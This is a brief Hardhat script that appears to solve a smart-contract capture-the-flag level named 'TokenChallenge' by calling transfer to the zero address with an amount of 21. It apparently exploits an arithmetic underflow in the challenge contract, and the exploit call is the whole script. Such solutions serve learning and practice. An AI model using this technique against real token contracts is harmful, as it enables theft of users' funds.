const { ethers } = require('hardhat');

const CHALLENGE_ADDRESS = '0x7daAc6A9DD5B5424c3727c8B862EcCb405638A59';

async function main() {
  const [owner] = await ethers.getSigners();

  const TokenChallenge = await ethers.getContractFactory('TokenChallenge');
  const challenge = await TokenChallenge.attach(CHALLENGE_ADDRESS);

  await challenge.transfer(ethers.constants.AddressZero, 21);
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
